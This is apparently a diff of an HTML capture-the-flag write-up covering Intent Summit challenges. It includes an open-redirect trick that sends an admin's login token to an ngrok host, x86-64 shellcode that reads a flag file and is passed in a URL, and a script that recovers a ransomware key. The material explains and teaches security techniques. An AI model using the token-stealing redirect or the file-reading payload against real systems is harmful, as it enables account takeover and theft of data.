-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">window.&lt;span style="color:#a6e22e">location&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">location&lt;/span>.&lt;span style="color:#a6e22e">origin&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">redirectTo&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;?token=&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">jsonData&lt;/span>.&lt;span style="color:#a6e22e">token&lt;/span>;
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>Because it is done with simple concatenation we can use the &lt;code>@&lt;/code> trick to fool the admin&amp;rsquo;s browser into redirecting him to a malicious link with the token as a query parameter when he logs in (which he does!):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>window.&lt;span style="color:#a6e22e">location&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">location&lt;/span>.&lt;span style="color:#a6e22e">origin&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">redirectTo&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;?token=&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">jsonData&lt;/span>.&lt;span style="color:#a6e22e">token&lt;/span>;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Because it is done with simple concatenation we can use the &lt;code>@&lt;/code> trick to fool the admin&amp;rsquo;s browser into redirecting him to a malicious link with the token as a query parameter when he logs in (which he does!):&lt;/p>
 &lt;p>&lt;a href="https://flag-vault.chal.intentsummit.org/?redirect=@xxxx-xx-xx-xx-xx.ngrok.io/">https://flag-vault.chal.intentsummit.org/?redirect=@xxxx-xx-xx-xx-xx.ngrok.io/&lt;/a>&lt;/p>
 &lt;p>After receiving the token, which expires in 10 seconds, we can quickly login and get the flag.&lt;/p>
 &lt;h1 id="mass-notes">Mass Notes&lt;/h1>
@@ -225,47 +234,49 @@ It took me a while (and a Discord message from Gianluca) to realize that the &lt
 &lt;pre tabindex="0">&lt;code class="language-x86asm=amd64" data-lang="x86asm=amd64">global _start
 section .text
 _start:
-mov rax, 2 ; &amp;quot;open&amp;quot;
+mov rax, 2 ; &amp;#34;open&amp;#34;
 mov rdi, path ;
 xor rsi, rsi ; O_RDONLY
 syscall
 mov rdi, rax ; fd (returned from open)
 sub rsp, 144 ; allocate stat struct
-mov rsi, rsp ; address of 'struct stat'
-mov rax, 5 ; &amp;quot;fstat&amp;quot; syscall
+mov rsi, rsp ; address of &amp;#39;struct stat&amp;#39;
+mov rax, 5 ; &amp;#34;fstat&amp;#34; syscall
 syscall
-mov rsi, [rsp+48] ; len = file size (from 'struct stat')
-add rsp, 144 ; free 'struct stat'
+mov rsi, [rsp+48] ; len = file size (from &amp;#39;struct stat&amp;#39;)
+add rsp, 144 ; free &amp;#39;struct stat&amp;#39;
 mov r8, rdi ; fd (still in rdi from last syscall)
 xor rdi, rdi ; address = 0
 mov rdx, 0x1 ; protection = PROT_READ
 mov r10, 0x2 ; flags = MAP_PRIVATE
 xor r9, r9 ; offset = 0
-mov rax, 9 ; &amp;quot;mmap&amp;quot; syscall
+mov rax, 9 ; &amp;#34;mmap&amp;#34; syscall
 syscall
 mov rdx, rsi ; count (file size from last call)
 mov rsi, rax ; buffer address (returned from mmap)
 mov rdi, 1 ; fd = stdout
-mov rax, 1 ; &amp;quot;write&amp;quot; syscall
+mov rax, 1 ; &amp;#34;write&amp;#34; syscall
 syscall
 mov rax, 231 ;
 mov rdi, 0 ; EXIT_SUCCESS
 syscall ; );
 section .rodata
-path: db &amp;quot;/home/flag.txt&amp;quot;,0
+path: db &amp;#34;/home/flag.txt&amp;#34;,0
 &lt;/code>&lt;/pre>&lt;p>Compile and link with:&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">nasm -f elf64 -o exploit.o exploit.asm
-ld -o exploit exploit.o
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>To launch the exploit we needed to convert the binary to base64 and add it to the challenge website query string.&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> base64
-&lt;span style="color:#f92672">import&lt;/span> urllib.parse
-&lt;span style="color:#66d9ef">with&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;exploit&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;rb&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
-content &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>read()
-payload &lt;span style="color:#f92672">=&lt;/span> base64&lt;span style="color:#f92672">.&lt;/span>b64encode(content)&lt;span style="color:#f92672">.&lt;/span>decode()
-payload &lt;span style="color:#f92672">=&lt;/span> urllib&lt;span style="color:#f92672">.&lt;/span>parse&lt;span style="color:#f92672">.&lt;/span>quote(payload)
-print(&lt;span style="color:#e6db74">&amp;#34;http://patterni.chal.intentsummit.org:9090/?arg=&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>payload)
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-plaintext" data-lang="plaintext">INTENT{pl4y1n6_1n_7h3_54nd_15_d4n63r0u5}
-&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="scadomware">Scadomware&lt;/h1>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nasm -f elf64 -o exploit.o exploit.asm
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ld -o exploit exploit.o
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>To launch the exploit we needed to convert the binary to base64 and add it to the challenge website query string.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> base64
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> urllib.parse
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">with&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;exploit&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;rb&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>read()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#f92672">=&lt;/span> base64&lt;span style="color:#f92672">.&lt;/span>b64encode(content)&lt;span style="color:#f92672">.&lt;/span>decode()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#f92672">=&lt;/span> urllib&lt;span style="color:#f92672">.&lt;/span>parse&lt;span style="color:#f92672">.&lt;/span>quote(payload)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#34;http://patterni.chal.intentsummit.org:9090/?arg=&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>payload)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span style="display:flex;">&lt;span>INTENT{pl4y1n6_1n_7h3_54nd_15_d4n63r0u5}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="scadomware">Scadomware&lt;/h1>
 &lt;blockquote>
 &lt;p>Someone hacked my OT network and dropped a ransomware! plz h3lp me recover this encrypted file!&lt;/p>
 &lt;/blockquote>
@@ -282,84 +293,98 @@ print(&lt;span style="color:#e6db74">&amp;#34;http://patterni.chal.intentsummit.
 &lt;li>The int checksum of the computer physical address (which we don&amp;rsquo;t know)&lt;/li>
 &lt;/ul>
 &lt;p>Be ware that the SHA1 output length isn&amp;rsquo;t enough for the AES key and therefore some of it is initialized with a simple function. The solve script is as follows:&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> hashlib
-&lt;span style="color:#f92672">from&lt;/span> Crypto.Cipher &lt;span style="color:#f92672">import&lt;/span> AES
-&lt;span style="color:#f92672">from&lt;/span> Crypto.Util.Padding &lt;span style="color:#f92672">import&lt;/span> unpad
-&lt;span style="color:#f92672">from&lt;/span> Crypto.Util.number &lt;span style="color:#f92672">import&lt;/span> bytes_to_long
-&lt;span style="color:#66d9ef">with&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;important.intent.enc&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;rb&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
-encrypted_file &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>read()
-original_size &lt;span style="color:#f92672">=&lt;/span> bytes_to_long(encrypted_file[&lt;span style="color:#ae81ff">6&lt;/span>:&lt;span style="color:#ae81ff">10&lt;/span>][::&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>])
-big_num &lt;span style="color:#f92672">=&lt;/span> bytes_to_long(encrypted_file[&lt;span style="color:#ae81ff">10&lt;/span>:&lt;span style="color:#ae81ff">14&lt;/span>][::&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>])
-encrypted_file &lt;span style="color:#f92672">=&lt;/span> encrypted_file[&lt;span style="color:#ae81ff">14&lt;/span>:&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>]
-&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">decrypt&lt;/span>(ip_int):
-hash_input &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{0:}&lt;/span>&lt;span style="color:#e6db74">0mgisthebestg&lt;/span>&lt;span style="color:#e6db74">{1:08x}{2:}&lt;/span>&lt;span style="color:#e6db74">---&lt;/span>&lt;span style="color:#e6db74">{3:}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(
-&lt;span style="color:#e6db74">&amp;#39;YouTakeTheRedPillYouStayInWonderlandAndIShowYouHowDeepTheRabbitHoleGoes&amp;#39;&lt;/span>, big_num, original_size, ip_int)
-hash_bytes &lt;span style="color:#f92672">=&lt;/span> hashlib&lt;span style="color:#f92672">.&lt;/span>sha1(hash_input&lt;span style="color:#f92672">.&lt;/span>encode())&lt;span style="color:#f92672">.&lt;/span>digest()
-aes_key &lt;span style="color:#f92672">=&lt;/span> bytearray([&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>)
-&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">32&lt;/span>):
-aes_key[i] &lt;span style="color:#f92672">=&lt;/span> (i &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x5b&lt;/span>) &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>
-&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(len(hash_bytes)):
-aes_key[i] &lt;span style="color:#f92672">=&lt;/span> hash_bytes[i]
-cipher &lt;span style="color:#f92672">=&lt;/span> AES&lt;span style="color:#f92672">.&lt;/span>new(bytes(aes_key), AES&lt;span style="color:#f92672">.&lt;/span>MODE_CBC, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;0010000300003007&amp;#39;&lt;/span>)
-out &lt;span style="color:#f92672">=&lt;/span> unpad(cipher&lt;span style="color:#f92672">.&lt;/span>decrypt(encrypted_file), &lt;span style="color:#ae81ff">16&lt;/span>)
-print(out&lt;span style="color:#f92672">.&lt;/span>decode())
-&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>():
-ip_int &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
-&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
-&lt;span style="color:#66d9ef">try&lt;/span>:
-decrypt(ip_int)
-&lt;span style="color:#66d9ef">break&lt;/span>
-&lt;span style="color:#66d9ef">except&lt;/span>:
-&lt;span style="color:#66d9ef">pass&lt;/span>
-ip_int &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
-&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;__main__&amp;#39;&lt;/span>:
-main()
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>To generate the static string I used this C program, mainly copy-pasted from the decompiler:&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
-&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
-&lt;/span>&lt;span style="color:#75715e">&lt;/span>
-&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#a6e22e">calcPass&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>input1,&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>input2)
-{
-&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>pbVar1;
-&lt;span style="color:#66d9ef">char&lt;/span> cVar2;
-uint outLen;
-&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>in2len;
-&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>res;
-uint index;
-uint uVar3;
-in2len &lt;span style="color:#f92672">=&lt;/span> input1;
-&lt;span style="color:#66d9ef">do&lt;/span> {
-cVar2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>in2len;
-in2len &lt;span style="color:#f92672">=&lt;/span> in2len &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
-} &lt;span style="color:#66d9ef">while&lt;/span> (cVar2 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>);
-outLen &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)in2len &lt;span style="color:#f92672">-&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)(input1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>);
-in2len &lt;span style="color:#f92672">=&lt;/span> input2;
-&lt;span style="color:#66d9ef">do&lt;/span> {
-cVar2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>in2len;
-in2len &lt;span style="color:#f92672">=&lt;/span> in2len &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
-} &lt;span style="color:#66d9ef">while&lt;/span> (cVar2 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>);
-res &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)malloc(outLen &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>);
-index &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
-&lt;span style="color:#66d9ef">if&lt;/span> (outLen &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
-&lt;span style="color:#66d9ef">do&lt;/span> {
-uVar3 &lt;span style="color:#f92672">=&lt;/span> index &lt;span style="color:#f92672">%&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)((&lt;span style="color:#66d9ef">int&lt;/span>)in2len &lt;span style="color:#f92672">-&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)(input2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>));
-pbVar1 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(res &lt;span style="color:#f92672">+&lt;/span> index);
-index &lt;span style="color:#f92672">=&lt;/span> index &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
-&lt;span style="color:#f92672">*&lt;/span>pbVar1 &lt;span style="color:#f92672">=&lt;/span> input2[uVar3] &lt;span style="color:#f92672">^&lt;/span> pbVar1[(&lt;span style="color:#66d9ef">int&lt;/span>)input1 &lt;span style="color:#f92672">-&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)res];
-} &lt;span style="color:#66d9ef">while&lt;/span> (index &lt;span style="color:#f92672">&amp;lt;&lt;/span> outLen);
-res[outLen] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>;
-&lt;span style="color:#66d9ef">return&lt;/span> res;
-}
-&lt;span style="color:#f92672">*&lt;/span>res &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>;
-&lt;span style="color:#66d9ef">return&lt;/span> res;
-}
-&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>() {
-&lt;span style="color:#66d9ef">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> in1 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;h&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">FgR&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Tg[VaRUcZ__n^F`GRNx]d&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">]STA_R]Sp]Wz`_^Dj&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">F&lt;/span>&lt;span style="color:#ae81ff">\x7f&lt;/span>&lt;span style="color:#e6db74">^DwVVGe[VaRUSZG{&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">[Tt&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">V@&amp;#34;&lt;/span>;
-&lt;span style="color:#66d9ef">char&lt;/span> in2 [] &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#ae81ff">0x31&lt;/span>, &lt;span style="color:#ae81ff">0x33&lt;/span>, &lt;span style="color:#ae81ff">0x33&lt;/span>, &lt;span style="color:#ae81ff">0x33&lt;/span>, &lt;span style="color:#ae81ff">0x33&lt;/span>, &lt;span style="color:#ae81ff">0x37&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>};
-&lt;span style="color:#66d9ef">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> pass &lt;span style="color:#f92672">=&lt;/span> calcPass(in1, (&lt;span style="color:#66d9ef">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>in2);
-printf(&lt;span style="color:#e6db74">&amp;#34;%s&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, pass);
-}
-&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="electron">Electron&lt;/h1>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> hashlib
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> Crypto.Cipher &lt;span style="color:#f92672">import&lt;/span> AES
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> Crypto.Util.Padding &lt;span style="color:#f92672">import&lt;/span> unpad
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> Crypto.Util.number &lt;span style="color:#f92672">import&lt;/span> bytes_to_long
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">with&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;important.intent.enc&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;rb&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> encrypted_file &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>read()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> original_size &lt;span style="color:#f92672">=&lt;/span> bytes_to_long(encrypted_file[&lt;span style="color:#ae81ff">6&lt;/span>:&lt;span style="color:#ae81ff">10&lt;/span>][::&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>])
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> big_num &lt;span style="color:#f92672">=&lt;/span> bytes_to_long(encrypted_file[&lt;span style="color:#ae81ff">10&lt;/span>:&lt;span style="color:#ae81ff">14&lt;/span>][::&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>])
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> encrypted_file &lt;span style="color:#f92672">=&lt;/span> encrypted_file[&lt;span style="color:#ae81ff">14&lt;/span>:&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">decrypt&lt;/span>(ip_int):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hash_input &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{0:}&lt;/span>&lt;span style="color:#e6db74">0mgisthebestg&lt;/span>&lt;span style="color:#e6db74">{1:08x}{2:}&lt;/span>&lt;span style="color:#e6db74">---&lt;/span>&lt;span style="color:#e6db74">{3:}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;YouTakeTheRedPillYouStayInWonderlandAndIShowYouHowDeepTheRabbitHoleGoes&amp;#39;&lt;/span>, big_num, original_size, ip_int)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hash_bytes &lt;span style="color:#f92672">=&lt;/span> hashlib&lt;span style="color:#f92672">.&lt;/span>sha1(hash_input&lt;span style="color:#f92672">.&lt;/span>encode())&lt;span style="color:#f92672">.&lt;/span>digest()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> aes_key &lt;span style="color:#f92672">=&lt;/span> bytearray([&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">32&lt;/span>):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> aes_key[i] &lt;span style="color:#f92672">=&lt;/span> (i &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x5b&lt;/span>) &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(len(hash_bytes)):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> aes_key[i] &lt;span style="color:#f92672">=&lt;/span> hash_bytes[i]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cipher &lt;span style="color:#f92672">=&lt;/span> AES&lt;span style="color:#f92672">.&lt;/span>new(bytes(aes_key), AES&lt;span style="color:#f92672">.&lt;/span>MODE_CBC, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;0010000300003007&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> out &lt;span style="color:#f92672">=&lt;/span> unpad(cipher&lt;span style="color:#f92672">.&lt;/span>decrypt(encrypted_file), &lt;span style="color:#ae81ff">16&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(out&lt;span style="color:#f92672">.&lt;/span>decode())
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>():
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip_int &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> decrypt(ip_int)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">pass&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip_int &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;__main__&amp;#39;&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> main()
